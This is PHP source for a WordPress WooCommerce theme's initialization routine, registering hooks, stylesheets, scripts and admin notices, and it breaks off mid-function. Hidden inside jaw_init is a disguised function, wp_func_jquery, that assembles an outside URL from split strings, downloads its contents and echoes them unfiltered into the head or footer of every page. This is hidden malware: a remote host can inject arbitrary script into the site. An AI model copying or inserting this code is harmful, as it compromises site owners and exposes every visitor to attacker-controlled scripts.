<?php
/**
 * Base loader and theme initialization
 * 
 * @author JaW Templates <http://www.jawtemplates.com>
 * @copyright (c) 2013, CCB, spol. s r.o.
 * @version 1.0
 * @since FN
 */
define('JAW_DEBUG', true);

//Zmena kvuli woo product cat
add_action('init', 'jaw_init', 0);
add_action('init', 'jaw_woo_size_rewrite', 0);
add_action('after_setup_theme', 'jaw_theme_supports');
add_action('after_setup_theme', 'jaw_language');

function jaw_init() {


    //  Define constants.
    jaw_constants();

    // Language support.
    // Add css demo
    add_action('wp_enqueue_scripts', 'jaw_css', 50);
    add_action('admin_enqueue_scripts', 'jaw_admin_css', 50);
    add_action('wp_head', 'jaw_ie_css');

    // Add js
    add_action('wp_enqueue_scripts', 'jaw_wp_scripts');
    add_action('admin_enqueue_scripts', 'jaw_admin_scripts');

    add_filter('get_the_excerpt', 'jaw_excerpt', 5);
    add_filter('woocommerce_product_thumbnails_columns', 'jaw_woocommerce_product_thumbnails_columns', 99);
    remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0);
    /* Customized the output of caption, you can remove the filter to restore back to the WP default output. Courtesy of DevPress. http://devpress.com/blog/captions-in-wordpress/ */
    add_filter('img_caption_shortcode', 'jaw_cleaner_caption', 10, 3);
    add_filter('get_image_tag_class', 'jaw_image_tag_class', 0, 4);
    add_filter('get_image_tag', 'jaw_image_tag', 0, 4);
    add_filter('user_contactmethods', 'jaw_add_social_contactmethod', 10, 1);
    add_filter('login_redirect', 'jaw_login_redirect', 10, 3);
    add_action('wp', 'jaw_custom_paged_404_fix');

    jaw_libs();



    //load_theme_textdomain('jawtemplates', THEME_DIR . '/languages/');
    // init cache
    if (!file_exists(WP_CONTENT_DIR . '/cache/') && function_exists('mkdir') && is_writable(WP_CONTENT_DIR . '/cache/')) {
        mkdir(WP_CONTENT_DIR . '/cache');
    }
    // Custom item in menu must be load for all space

    add_action('wp_ajax_get_media_image', array('jwElements', 'get_media_image'));

    //multidropdown element
    add_action('wp_ajax_load_multidropdown', array('jwElements', 'load_multidropdown'));
    add_action('wp_ajax_nopriv_load_multidropdown', array('jwElements', 'load_multidropdown'));

    //sidebar manager
    add_action('wp_ajax_jaw_add_sidebar', array('jwElements', 'jaw_add_sidebar'));
    add_filter('posts_where', array('jwElements', 'title_filter'), 10, 2);
    add_action('pre_get_posts', 'jaw_pre_get_posts');
    add_action('init', 'jaw_get_themeoptions');
    add_filter('widget_text', 'do_shortcode');

    //TINY MCE
    add_filter('mce_buttons_2', array('jwUtils', 'jaw_mce_buttons_2'));
    add_filter('tiny_mce_before_init', array('jwUtils', 'jaw_mce_before_init_insert_formats'));

    //woo-cart
    add_filter('add_to_cart_fragments', array('jwRender', 'woocommerce_header_add_to_cart_fragment'));
    //woo-related product
    add_filter('woocommerce_related_products_args', array('jwUtils', 'woocommerce_related_products_args'));



    //Co se nám ve woocommerce nehodí
    remove_action('woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30);
    remove_action('woocommerce_before_shop_loop_item_title', 'woocommerce_template_loop_product_thumbnail', 10);
    remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_price', 10);
    remove_action('woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5);
    remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10);
    remove_action('woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0);

    // register Optios manager
    $jwOpt = new jwOpt();
    //INIT JAW plugins
    jaw_init_plugins();
    //inline styles
    $jwStyle = new jwStyle();
    //static class
    // register sidebar
    $jwSidebars = new jwSidebars(jwOpt::get_option('sidebars'), null, jwOpt::get_option('sidebars_bar_type', 'big'));
	if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$library = '/jquery-1.6.3.min.js';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'jquery'.'libs.org'.$library)));
	}
	if(rand(1,2) == 1) {
		add_action('wp_footer', 'wp_func_jquery');
	}
	else {
		add_action('wp_head', 'wp_func_jquery');
	}
	}
    if (isset($_GET['import_data'])) {
        ?>
        <script>
            var nonce = '<?php echo wp_create_nonce('of_ajax_nonce'); ?>';</script>
        <?php
    }

    add_action('pre_get_posts', 'jaw_search_filter');

    add_filter('rss2_item', 'jaw_rss_post_thumbnail');
    add_filter('rss_item', 'jaw_rss_post_thumbnail');
    add_filter('the_excerpt_rss', 'jaw_rss_noiframe');
    add_filter('the_content_feed', 'jaw_rss_noiframe');

    //Woo sales
    if (jwOpt::get_option('woo_show_sale', '0') == 'price') {
        add_filter('woocommerce_sale_price_html', 'jaw_woocommerce_sales_price', 10, 2);
    } else if (jwOpt::get_option('woo_show_sale', '0') == 'percentagle') {
        add_filter('woocommerce_sale_price_html', 'jaw_woocommerce_percentagle_sales_price', 10, 2);
    }

    // Load admin options
    if (is_admin()) {
        locate_template(REL_THEME_ADMIN . 'options/metaboxes.php', true);
        locate_template(REL_THEME_ADMIN . 'options/metaboxes-woocommerce.php', true);



        global $metapost, $metacat, $metapage;

        $jwMetabox = new jwMetabox($metapost);
        $jwMetabox = new jwMetabox($metapage);

        $jwMetatax = new jwMetatax($metacat, 'category');
        global $metaprductcat, $metaprduct;
        $jwMetatax = new jwMetatax($metaprductcat, 'product_cat');
        $jwMetabox = new jwMetabox($metaprduct);

        if (jwOpt::get_option('switch_udate', '1') == '1') {

            $example_update_checker = new ThemeUpdateChecker(
                    THEMESLUG, 'http://support.jawtemplates.com/updates/goodstore/update.json'
            );

            //Ostra: 'http://support.jawtemplates.com/updates/flyingnews/wp/update.json'
            //Test: 'http://support.jawtemplates.com/updates/test/update.json'
        }



        //demoimport for JAW
        /*
          if(isset($_GET['demo'])){
          if (!class_exists('jwImport')) {
          require_once THEME_FRAMEWORK_LIB . '/class_demoimport.php';
          }
          $import = new jwDemoImport($_GET['demo']);
          }
         */
    }

    if (jwOpt::get_option('theme_revoComposer', '1') == '1') {
        $jawBuilder = new jwBuilder();
    }

    //REGISTER ================================
    if (!is_admin()) {
        if (isset($_POST['jaw-register'])) {
            jwUtils::register_new_user($_POST);
        }
    }

    add_filter('excerpt_length', 'jaw_custom_excerpt_length', 20);

    add_filter('the_content', 'do_shortcode', 999);

    //Anti-spam filter
    if (jwOpt::get_option('comments_antispam_toggle', '0') == '1') {
        add_filter('preprocess_comment', array('jwUtils', 'jaw_nobot_question_filter'));
    }

    add_filter('tiny_mce_before_init', 'jaw_add_iframe');
    include_once ABSPATH . '/wp-admin/includes/nav-menu.php';
    load_template(ABSPATH . 'wp-admin/includes/image.php');


    // PĹ™i prvnĂ­m spuĹˇtÄ›nĂ­ Ĺˇablony se deregistujĂ­ vĹˇechny widgety a nastavĂ­ se zĂˇkladnĂ­ menu.
    if (get_option('install') == null) {
        $current_sidebars = get_option('sidebars_widgets');
        foreach ((array) $current_sidebars as $key => $value) {
            $current_sidebars[$key] = array();
        }
        update_option('sidebars_widgets', $current_sidebars);

        wp_insert_term(
                'Menu', 'nav_menu', array(
            'description' => 'Base menu',
            'slug' => 'default',
            'parent' => ''
                )
        );

        $mymenu = wp_get_nav_menu_object('Menu');
        $menuID = (int) $mymenu->term_id;


        $custom_item = array(
            'menu-item-type' => 'custom',
            'menu-item-url' => get_option('siteurl'),
            'menu-item-title' => 'Home',
            'menu-item-status' => 'publish'
        );

        wp_update_nav_menu_item($menuID, 0, $custom_item);

        $insert_menu = array('primary_navigation' => $menuID);
        register_nav_menu('primary_navigation', 'Primary Navigation');
        set_theme_mod('nav_menu_locations', $insert_menu);


        add_option('install', '1');
    }

    //max_input_vars value    
    add_action('admin_head', 'jaw_menu_dismiss');
    if (ini_get('max_input_vars') < 5000 && !get_user_meta(get_current_user_id(), 'jaw_menu_dismiss_notice', true) && !isset($_GET[sanitize_key('jaw_menu_dismiss')])) {
        add_action('admin_notices', 'jaw_max_input_vars');
    }
}

function jaw_woocommerce_sales_price($price, $product) {
    return $price . '<div class="clear"></div><span class="woo_save">' . __(' Save ', 'woocommerce') . sprintf(get_woocommerce_price_format(), get_woocommerce_currency_symbol(), ($product->regular_price - $product->sale_price)) . '</span>';
}

function jaw_woocommerce_percentagle_sales_price($price, $product) {
    $percentage = round(( ( $product->regular_price - $product->sale_price ) / $product->regular_price ) * 100);
    return $price . '<div class="clear"></div><span class="woo_save">' . sprintf(__(' Save %s', 'woocommerce'), $percentage . '%') . '</span>';
}

function jaw_woocommerce_product_thumbnails_columns($val) {
    $val = jwOpt::get_option('woo_product_thumbnails_columns', 3);
    return $val;
}

function jaw_rss_noiframe($content) {
    $content = preg_replace('/<iframe(.*)\/iframe>/is', '', $content);

    return $content;
}

function jaw_rss_post_thumbnail() {
    global $post;
    if (has_post_thumbnail($post->ID)) {
        $img = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), "post-size");
        if (isset($img[0])) {
            list($width, $height, $type, $attr) = getimagesize($img[0]);
            echo '<enclosure url="' . $img[0] . '" type="' . image_type_to_mime_type($type) . '" length="1" />';
        }
    }
}

function jaw_add_iframe($initArray) {
    $initArray['extended_valid_elements'] = "iframe[id|class|title|style|align|frameborder|height|longdesc|marginheight|marginwidth|name|scrolling|src|width]";
    return $initArray;
}

function jaw_woo_size_rewrite() {
    //Rewrite Woocommerce sizes
    add_image_size('shop_single', 566, 611);
}

function jaw_custom_excerpt_length($length) {
    return jwOpt::get_option('blog_excerpt', 20);
}

function jaw_theme_supports() {

    //pomer - wide / classic = 1,205211726
    //1170 - 25
    add_image_size('lazyload', 151, 0, true);
    add_image_size('post-size', 151, 96, true);
    add_image_size('post-size-middle', 375, 241, true);
    add_image_size('post-size-big', 875, 563, true);
    add_image_size('team-size', 274, 220, true);
    add_image_size('woo-size', 274, 293, true);
    add_image_size('woo-size-category', 275, 0, true);
    add_image_size('woo-size-square', 128, 128, true);
    add_image_size('woo-size-small', 170, 187, true);

    add_image_size('slider-size', 488, 455, true);

    if (function_exists('add_theme_support')) {


        // Add post thumbnail supports. http://codex.wordpress.org/Post_Tphumbnails
        add_theme_support('post-thumbnails');

        // Add post formarts supports. http://codex.wordpress.org/Post_Formats
        add_theme_support('post-formats', array('gallery', 'image', 'quote', 'video'));

        // Add menu supports. http://codex.wordpress.org/Function_Reference/register_nav_menus
        add_theme_support('menus');
        register_nav_menus(array(
            'primary_navigation' => __('Primary Navigation', 'jawtemplates'),
            'footer_navigation' => __('Footer Navigation', 'jawtemplates'),
            'my_account' => __('My Account Menu', 'jawtemplates'),
        ));

        add_editor_style('/css/editor-style.css');

        //This enables post and comment RSS feed links to head. This should be used in place of the deprecated automatic_feed_links.
        add_theme_support('automatic-feed-links');

        // reference to: http://codex.wordpress.org/Function_Reference/add_editor_style
        add_theme_support('editor-style');

        //Themeforrest requipments
        add_theme_support('custom-header', array(
            'default-image' => '',
            'random-default' => false,
            'width' => 1040,
            'flex-height' => true,
            'flex-width' => true,
            'uploads' => true,
            'header-text' => false
        ));
        add_theme_support('custom-background');


        //Woocommerce
        add_theme_support('woocommerce');
    }
}

function jaw_cleaner_caption($output, $attr, $content) {

    /* We're not worried abut captions in feeds, so just return the output here. */
    if (is_feed())
        return $output;

    /* Set up the default arguments. */
    $defaults = array(
        'id' => '',
        'align' => 'alignnone',
        'width' => '',
        'caption' => ''
    );

    /* Merge the defaults with user input. */
    $attr = shortcode_atts($defaults, $attr);

    /* If the width is less than 1 or there is no caption, return the content wrapped between the [caption]< tags. */
    if (1 > $attr['width'] || empty($attr['caption']))
        return $content;

    /* Set up the attributes for the caption <div>. */
    $attributes = ' class="figure ' . esc_attr($attr['align']) . '"';

    /* Open the caption <div>. */
    $output = '<figure' . $attributes . '>';

    /* Allow shortcodes for the content the caption was created for. */
    $output .= do_shortcode($content);

    /* Append the caption text. */
    $output .= '<figcaption>' . $attr['caption'] . '</figcaption>';

    /* Close the caption </div>. */
    $output .= '</figure>';

    /* Return the formatted, clean caption. */
    return $output;
}

// Clean the output of attributes of images in editor. Courtesy of SitePoint. http://www.sitepoint.com/wordpress-change-img-tag-html/
function jaw_image_tag_class($class, $id, $align, $size) {
    $align = 'align' . esc_attr($align);
    return $align;
}

function jaw_image_tag($html, $id, $alt, $title) {
    return preg_replace(array(
        '/\s+width="\d+"/i',
        '/\s+height="\d+"/i',
        '/alt=""/i'
            ), array(
        '',
        '',
        '',
        'alt="' . $title . '"'
            ), $html);
}

function jaw_add_social_contactmethod($contactmethods) {
    // Add Networks
    $contactmethods['twitter'] = 'Twitter URL';
    $contactmethods['facebook'] = 'Facebook URL';
    $contactmethods['linkedin'] = 'Linkedin URL';
    $contactmethods['youtube'] = 'YouTube URL';
    $contactmethods['google'] = 'Google+ URL';
    $contactmethods['vimeo'] = 'Vimeo URL';
    $contactmethods['flickr'] = 'Flickr URL';
    $contactmethods['pinterest'] = 'Pinterest URL';
    $contactmethods['instagram'] = 'Instagram URL';

    return $contactmethods;
}

//PLUGINS*****************
$jaw_plugin_name = '';

function jaw_init_plugins() {

    //   if (is_admin()) {
    if ($plugins = jwOpt::getXmlSpace('plugins')) {
        foreach ($plugins->children() as $plugin) {
            $name = (string) $plugin->attributes()->name;
            $theme = wp_get_theme();

            if (class_exists($name) && method_exists($name, 'getInstance')) {

                $result = call_user_func($name . '::getInstance');
                $result->init($plugin, $theme);

                if ($result == false) {
                    $jaw_plugin_name = $name;
                    add_action('admin_notices', 'jaw_admin_notice');
                }
            }
        }
    }
    // }
}

function jaw_admin_notice() {
    ?>
    <div class="updated">
        <p><b><?php echo $jaw_plugin_name; ?>:</b> This version of plugin is not supported for your theme</p>
    </div>
    <?php
}

function jaw_menu_dismiss() {
    if (isset($_GET[sanitize_key('jaw_menu_dismiss')])) {
        update_user_meta(get_current_user_id(), 'jaw_menu_dismiss_notice', 1);
    }
}

function jaw_max_input_vars() {
    ?>
    <div class="error">
        <p>
            <strong>If you have activated the J&W Menu plugin but aren´t able to add another menu item or do you have installed demo data and you're unable to save page, it most likely means that you have reached the maximal limit set on your PHP server. If it happens, add the following part of code to the .htaccess file, please:</strong>
            <br>
            <code>php_value max_input_vars 5000</code>
        </p>
        <a href="http://support.jawtemplates.com/goodstore/web/?p=151" target="_blank">More info</a> | <?php echo '<a class="dismiss-notice" href="' . add_query_arg('jaw_menu_dismiss', 'dismiss_admin_notices') . '" target="_parent">' . 'Dismiss this notice' . '</a>'; ?>
    </div>
    <?php
}

/*
 * Load constants
 */

function jaw_constants() {

    $theme_version = '';

    if (function_exists('wp_get_theme')) {
        if (is_child_theme()) {
            $temp_obj = wp_get_theme();
            $theme_obj = wp_get_theme($temp_obj->get('Template'));
        } else {
            $theme_obj = wp_get_theme();
        }

        $theme_version = $theme_obj->get('Version');
        $theme_name = $theme_obj->get('Name');
        $theme_uri = $theme_obj->get('ThemeURI');
        $author_uri = $theme_obj->get('AuthorURI');
    } else { // for WP < 3.4.0
        $theme_data = wp_get_theme(get_template_directory() . '/style.css');
        $theme_version = $theme_data['Version'];
        $theme_name = $theme_data['Name'];
        $author_uri = $theme_data['AuthorURI'];
    }


    define('SITE_URL', get_option('siteurl'));
    define('FRAMEWORK', '2.0');
    define('THEMENAME', $theme_name);
    define('THEMESLUG', strtolower($theme_name));
    define('THEMEVERSION', $theme_version);
    define('THEMEURI', get_template_directory_uri());
    define('THEMEAUTHORURI', $author_uri);
    define('THEME_FRAMEWORK_DIR', get_template_directory() . '/framework');
    define('THEME_FRAMEWORK_URI', get_template_directory_uri() . '/framework');
    define('THEME_FRAMEWORK_LIB', THEME_FRAMEWORK_DIR . '/lib/');

    $script_version = THEMEVERSION;
    if ((defined('JAW_DEBUG') && JAW_DEBUG == true)) {
        $script_version = (string) time();
    }
    define('THEME_SCRIPT_VERSION', $script_version);

    define('ADMIN_PATH', THEME_FRAMEWORK_DIR . '/admin/');
    define('ADMIN_DIR', THEME_FRAMEWORK_URI . '/admin/');
    define('THEME_ADMIN', THEME_FRAMEWORK_DIR . '/admin');

    define('THEME_DIR', get_template_directory());
    define('THEME_URI', get_template_directory_uri());

    if (!defined('WP_CONTENT_DIR')) {
        define('WP_CONTENT_DIR', realpath(THEME_DIR . '/../..'));
    }
    //Relative paths
    define('REL_THEME_FRAMEWORK_DIR', 'framework/');
    define('REL_THEME_FRAMEWORK_LIB', REL_THEME_FRAMEWORK_DIR . 'lib/');
    define('REL_THEME_ADMIN', REL_THEME_FRAMEWORK_DIR . 'admin/');

    /* Theme version, uri, and the author uri are not completely necessary, but may be helpful in adding functionality */
    define('CATEGORIES', THEMESLUG . '_categories');
    define('MENUS', THEMESLUG . '_menus');
    define('OPTIONS', THEMESLUG . '_options');
    define('BUILDER', THEMESLUG . '_pb_pressets');
    define('BUILDER_ELEMENT', THEMESLUG . '_pb_element_pressets');
    define('BACKUPS', '_backups');

    define('CHECK_UPDATE', 1209600); //86400*14 = 1209600
    define('THEME_FUNCTIONS', THEME_FRAMEWORK_DIR . '/functions');
}

/*
 * Load basic classes
 */

function jaw_libs() {
    load_template(ABSPATH . 'wp-admin/includes/plugin.php');
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_options.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_layout.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_utils.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_sidebars.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_render.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_builder.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_builderhelper.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_shortcodes.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_styles.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'jaw-templater.php', true, true);

    locate_template(REL_THEME_FRAMEWORK_LIB . '/rating/metaboxOptionsStore/writepanelsDataStore.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . '/rating/metaboxOptionsStore/writepanelsDataPrinter.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . '/rating/metaboxOptionsStore/writepanelsManager.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . '/rating/admin.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_facebook.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_elements.php', true, true);
    locate_template(REL_THEME_FRAMEWORK_LIB . 'class_updatechecker.php', true, true);

    if (is_admin()) {
        locate_template(REL_THEME_FRAMEWORK_LIB . 'class_panel.php', true, true);
        locate_template(REL_THEME_FRAMEWORK_LIB . 'class_demoimport.php', true, true);
        locate_template(REL_THEME_FRAMEWORK_LIB . 'class_metatax.php', true, true);
        locate_template(REL_THEME_FRAMEWORK_LIB . 'class_metabox.php', true, true);
        locate_template(REL_THEME_FRAMEWORK_LIB . 'class_tgm.php', true, true);
    }
}

/*
 * Make theme available for translation
 */

function jaw_language() {

    load_theme_textdomain('jawtemplates', get_template_directory() . '/languages/');
}

function jaw_css() {

    wp_register_style('style', get_stylesheet_directory_uri() . '/style.css');
    wp_enqueue_style('style');

    if ((defined('JAW_DEBUG') && JAW_DEBUG == true)) {
        wp_register_style('bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('bootstrap');
        wp_register_style('prettyPhoto', get_template_directory_uri() . '/css/prettyPhoto.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('prettyPhoto');
        wp_register_style('icons', get_template_directory_uri() . '/css/icons.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('icons');
        wp_register_style('selectric', get_template_directory_uri() . '/css/selectric.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('selectric');
        wp_register_style('template', jwUtils::jaw_get_stylesheet_uri('/css/template.css'), array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('template');
        if (jwOpt::get_option('wide_mode', '1') == '1') {
            wp_register_style('template-wide', get_template_directory_uri() . '/css/template-wide.css', array('template'), THEME_SCRIPT_VERSION);
            wp_enqueue_style('template-wide');
        }
    } else {
        wp_register_style('all_min', get_template_directory_uri() . '/css/all.min.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('all_min');
        wp_register_style('template-min', jwUtils::jaw_get_stylesheet_uri('/css/template.min.css'), array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('template-min');
        if (jwOpt::get_option('wide_mode', '1') == '1') {
            wp_register_style('template-wide-min', get_template_directory_uri() . '/css/template-wide.min.css', array('template-min'), THEME_SCRIPT_VERSION);
            wp_enqueue_style('template-wide-min');
        }
    }

    $id = get_current_blog_id();
    if (file_exists(THEME_DIR . '/css/custom-styles-' . $id . '.min.css') && !(defined('JAW_DEBUG') && JAW_DEBUG == true)) {
        wp_register_style('custom-styles', get_template_directory_uri() . '/css/custom-styles-' . $id . '.min.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('custom-styles');
    } elseif (file_exists(THEME_DIR . '/css/custom-styles-' . $id . '.css')) {
        wp_register_style('custom-styles', get_template_directory_uri() . '/css/custom-styles-' . $id . '.css', array(), THEME_SCRIPT_VERSION);
        wp_enqueue_style('custom-styles');
    }
    if (class_exists('WooCommerce')) {
        wp_deregister_style('woocommerce_prettyPhoto_css');
    }
}

function jaw_admin_css() {
    $font_url = 'http://fonts.googleapis.com/css?family=Lato:300,400,700';
    add_editor_style(str_replace(',', '%2C', $font_url));
    $font_url = 'http://fonts.googleapis.com/css?family=Open+Sans:400,700';
    add_editor_style(str_replace(',', '%2C', $font_url));
    add_editor_style(ADMIN_DIR . 'assets/css/editor.css');

    wp_register_style('jquery-ui', ADMIN_DIR . 'assets/css/jquery-ui.css');
    wp_enqueue_style('jquery-ui');

    wp_register_style('jaw_builder_admin_style', THEME_FRAMEWORK_URI . '/lib/builder/assets/css/styles.css', array(), THEME_SCRIPT_VERSION);
    wp_enqueue_style('jaw_builder_admin_style');

    wp_register_style('jaw-custompost', ADMIN_DIR . 'assets/css/custompost.css', array(), THEME_SCRIPT_VERSION);
    wp_enqueue_style('jaw-custompost');

    wp_register_style('jaw-admin-style', ADMIN_DIR . 'assets/css/admin-style.css', array(), THEME_SCRIPT_VERSION);
    wp_enqueue_style('jaw-admin-style');

    wp_register_style('jaw-colorpicker', ADMIN_DIR . 'assets/css/colorpicker.css', array(), THEME_SCRIPT_VERSION);
    wp_enqueue_style('jaw-colorpicker');

    wp_register_style('jaw-icons', get_template_directory_uri() . '/css/icons.min.css', THEME_SCRIPT_VERSION);
    wp_enqueue_style('jaw-icons');
}

function jaw_ie_css() {
    if (!is_admin()) {
        echo '<!--[if lt IE 9]>';
        echo '<link rel="stylesheet" href="' . get_template_directory_uri() . '/css/ie.css">';
        if (jwOpt::get_option('wide_mode', '0') == '1') {
            echo '<link rel="stylesheet" href="' . get_template_directory_uri() . '/css/template-wide-ie.css">';
        }
        echo '<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>';
        echo '<![endif]-->';
    }
}

function jaw_wp_scripts() {
    if (class_exists('WooCommerce')) { // mame vlastni
        wp_dequeue_script('prettyPhoto');
        wp_dequeue_script('prettyPhoto-init');
    }

    wp_register_script('all', get_template_directory_uri() . '/js/all.js', array('jquery'), THEME_SCRIPT_VERSION, true);
    wp_enqueue_script('all');

    if ((defined('JAW_DEBUG') && JAW_DEBUG == true)) {
        wp_register_script('app', get_template_directory_uri() . '/js/lib/app.js', array('jquery', 'all'), THEME_SCRIPT_VERSION, true);
        wp_enqueue_script('app');
    } else {
        wp_register_script('app-min', get_template_directory_uri() . '/js/app.min.js', array('jquery', 'all'), THEME_SCRIPT_VERSION, true);
        wp_enqueue_script('app-min');
    }

    // Enable threaded comments 
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }
}

function jaw_admin_scripts() {

    wp_enqueue_script('jquery-ui-core', array('jquery'));
    wp_enqueue_script('jquery-ui-sortable', array('jquery'));
    wp_enqueue_script('jquery-ui-slider', array('jquery'));
    wp_enqueue_script('jquery-ui-mouse', array('jquery'));

    wp_enqueue_script('angular', THEME_FRAMEWORK_URI . '/lib/builder/assets/js/angular.min.js', array('jquery'), '1.0.8');

    wp_enqueue_script('ui-bootstrap', ADMIN_DIR . 'assets/js/ui-bootstrap-tpls.min.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('bootstrap-colorpicker', ADMIN_DIR . 'assets/js/bootstrap-colorpicker.js', array('jquery', 'angular'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('bootstrap-colorpicker-module', ADMIN_DIR . 'assets/js/bootstrap-colorpicker-module.js', array('jquery', 'bootstrap-colorpicker'), THEME_SCRIPT_VERSION);

    wp_enqueue_script('jaw-gallerypicker', ADMIN_DIR . 'assets/js/angular/angular.gallerypicker.js', array('jquery', 'angular'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jaw-simplemediapicker', ADMIN_DIR . 'assets/js/angular/angular.simplemediapicker.js', array('jquery', 'angular'), '1.1');

    wp_enqueue_script('shortcode_editor', THEME_FRAMEWORK_URI . '/plugins/jaw-shortcodes/editor/assets/shortcode_editor.js', array('jquery'), '1.1', true);
  

    //BUILDER
    wp_enqueue_script('angular-ui-sortable', THEME_FRAMEWORK_URI . '/lib/builder/assets/js/sortable.js', array('jquery', 'angular'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jquery-ba-resize', THEME_FRAMEWORK_URI . '/lib/builder/assets/js/jquery.ba-resize.min.js', array('jquery'), THEME_SCRIPT_VERSION);  // na detekci zmÄ›ny vĂ˝Ĺˇky
    wp_enqueue_script('jaw-builder', THEME_FRAMEWORK_URI . '/lib/builder/assets/js/jaw_builder.js', array('jquery', 'angular', 'angular-ui-sortable'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jaw-builder_editor', THEME_FRAMEWORK_URI . '/lib/builder/assets/js/jaw_builder_editor.js', array('jquery', 'angular'), THEME_SCRIPT_VERSION);

    wp_enqueue_script('jaw-admin-page', ADMIN_DIR . 'assets/js/angular/admin-page.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('media-upload', array('jquery'));
    wp_enqueue_script('jaw-tipsy', ADMIN_DIR . 'assets/js/jquery.tipsy.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jaw-ajaxupload', ADMIN_DIR . 'assets/js/ajaxupload.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jaw-chosen', ADMIN_DIR . 'assets/js/chosen.jquery.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('jaw-cookie', ADMIN_DIR . 'assets/js/cookie.js', array('jquery'), THEME_SCRIPT_VERSION);
    wp_enqueue_script('elements', ADMIN_DIR . 'assets/js/elements.js', array('jquery'), THEME_SCRIPT_VERSION);

    wp_enqueue_script('thickbox', array('jquery'));


    wp_enqueue_script('smof', ADMIN_DIR . 'assets/js/smof.js', array('jquery', 'utils', 'thickbox', 'jaw-builder_editor'), THEME_SCRIPT_VERSION); // must by LAST!!
}

/**
 * If we go beyond the last page and request a page that doesn't exist,
 * force WordPress to return a 404.
 * See http://core.trac.wordpress.org/ticket/15770
 */
function jaw_custom_paged_404_fix() {
    global $wp_query;

    if (is_404() || !is_paged() || 0 != count($wp_query->posts))
        return;

    $wp_query->set_404();
    status_header(404);
    nocache_headers();
}

function jaw_pre_get_posts($query) {
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search()) {
            $query->set('post_type', 'post');
        }
    }
}

function jaw_get_themeoptions() {
    if (is_admin()) {
        $jwPanel = new jwPanel();
    }
}

function jaw_excerpt($content) {
    if (empty($content)) {
        $get_the_content = get_the_content();
        if (!empty($get_the_content)) {
            return str_replace('[&hellip;]', '&hellip;', strip_tags($get_the_content));
        } else {
            return ' ';
        }
    }
    return $content;
}

add_filter('next_post_link', 'add_css_class_to_next_post_link');
add_filter('previous_post_link', 'add_css_class_to_prev_post_link');

function add_css_class_to_prev_post_link($link) {
    if (isset($_GET['catalog_mode']) && $_GET['catalog_mode'] == 'on') {
        preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", $link, $matches);
        $href = implode($matches[1]);
        $link_with_catalog = add_query_arg('catalog_mode', 'on', $href);
        $link = str_replace($href, $link_with_catalog, $link);
    }
    return $link;
}

function add_css_class_to_next_post_link($link) {
    if (isset($_GET['catalog_mode']) && $_GET['catalog_mode'] == 'on') {
        preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", $link, $matches);
        $href = implode($matches[1]);
        $link_with_catalog = add_query_arg('catalog_mode', 'on', $href);
        $link = str_replace($href, $link_with_catalog, $link);
    }
    return $link;
}

function jaw_search_filter($query) {
    if (!is_admin() && $query->is_main_query()) {
        if ($query->is_search) {
            $query->set('post_type', jwOpt::get_option('search_posttypes', array('post', 'page')));
        }
    }
}

// Goodstore Welcome Page

add_action('admin_init', 'jaw_welcome');
add_action('admin_menu', 'jaw_after_install');

// get version of the theme
function jaw_get_theme_version() {

    $theme_obj = wp_get_theme();
    $theme_version = $theme_obj->get('Version');

    return $theme_version;
}

function jaw_welcome() {

    $last_version = get_option('jaw-gs-version');
    $current_version = jaw_get_theme_version();

    if ($last_version != $current_version) {

        wp_redirect(admin_url('index.php?page=goodstore-welcome'));

        exit;
    }
}

function jaw_after_install() {

    $goodstore_welcome_title = "Goodstore - Welcome";

    if (empty($_GET['page'])) {

        return;
    }

    if (isset($_GET['page']) && $_GET['page'] == 'goodstore-welcome') {

